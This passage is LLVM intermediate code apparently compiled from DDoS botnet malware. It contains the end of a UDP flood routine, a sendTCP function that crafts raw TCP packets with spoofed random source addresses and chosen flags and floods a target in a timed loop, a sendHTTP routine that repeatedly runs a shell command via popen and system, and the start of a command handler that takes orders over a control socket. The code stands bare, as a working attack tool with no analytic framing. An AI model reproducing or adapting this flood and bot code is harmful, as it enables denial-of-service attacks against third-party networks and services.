  br i1 %223, label %224, label %226

; <label>:224:                                    ; preds = %212
  %225 = call i32 @rand_cmwc()
  br label %231

; <label>:226:                                    ; preds = %212
  %227 = load i32, i32* %8, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #13
  %230 = zext i16 %229 to i32
  br label %231

; <label>:231:                                    ; preds = %226, %224
  %232 = phi i32 [ %225, %224 ], [ %230, %226 ]
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.3* %235 to %struct.anon.4*
  %237 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %236, i32 0, i32 1
  store i16 %233, i16* %237, align 2
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 3
  store i16 %239, i16* %241, align 4
  %242 = load i32, i32* %22, align 4
  %243 = call i32 @getRandomIP(i32 %242)
  %244 = call i32 @htonl(i32 %243) #13
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 8
  store i32 %244, i32* %246, align 4
  %247 = bitcast i8* %144 to i16*
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 2
  %250 = load i16, i16* %249, align 2
  %251 = zext i16 %250 to i32
  %252 = call zeroext i16 @csum(i16* %247, i32 %251)
  %253 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 7
  store i16 %252, i16* %254, align 2
  %255 = load i32, i32* %27, align 4
  %256 = load i32, i32* %14, align 4
  %257 = icmp eq i32 %255, %256
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %231
  %259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %260 = load i32, i32* %26, align 4
  %261 = icmp sgt i32 %259, %260
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %258
  br label %267

; <label>:263:                                    ; preds = %258
  store i32 0, i32* %27, align 4
  br label %211

; <label>:264:                                    ; preds = %231
  %265 = load i32, i32* %27, align 4
  %266 = add i32 %265, 1
  store i32 %266, i32* %27, align 4
  br label %211

; <label>:267:                                    ; preds = %262
  %268 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

; <label>:269:                                    ; preds = %267, %116, %108, %103, %66, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %339

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %339

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  br label %339

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @getRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %10, align 4
  %280 = add nsw i32 %278, %279
  store i32 %280, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %281

; <label>:281:                                    ; preds = %334, %333, %256
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %77, i64 %75, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %19, align 4
  %287 = call i32 @getRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %77 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %25, align 4
  %326 = load i32, i32* %15, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %282
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %24, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %337

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %25, align 4
  br label %281

; <label>:334:                                    ; preds = %282
  %335 = load i32, i32* %25, align 4
  %336 = add i32 %335, 1
  store i32 %336, i32* %25, align 4
  br label %281

; <label>:337:                                    ; preds = %332
  %338 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %338)
  br label %339

; <label>:339:                                    ; preds = %337, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i32 0, i32 0)) #2
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #2
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %17 = call i8* @strcat(i8* %16, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0)) #2
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

; <label>:20:                                     ; preds = %24, %2
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = icmp sgt i32 %21, %22
  br i1 %23, label %24, label %27

; <label>:24:                                     ; preds = %20
  %25 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %26 = call i32 @system(i8* %25)
  br label %20

; <label>:27:                                     ; preds = %20
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare %struct._IO_FILE* @popen(i8*, i8*) #3

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %35, label %32

; <label>:32:                                     ; preds = %2
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0))
  br label %484

; <label>:35:                                     ; preds = %2
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %46, label %41

; <label>:41:                                     ; preds = %35
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i8* @inet_ntoa(i32 %43) #2
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %42, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i32 0, i32 0), i8* %44)
  br label %484

; <label>:46:                                     ; preds = %35
  %47 = load i8**, i8*** %4, align 8
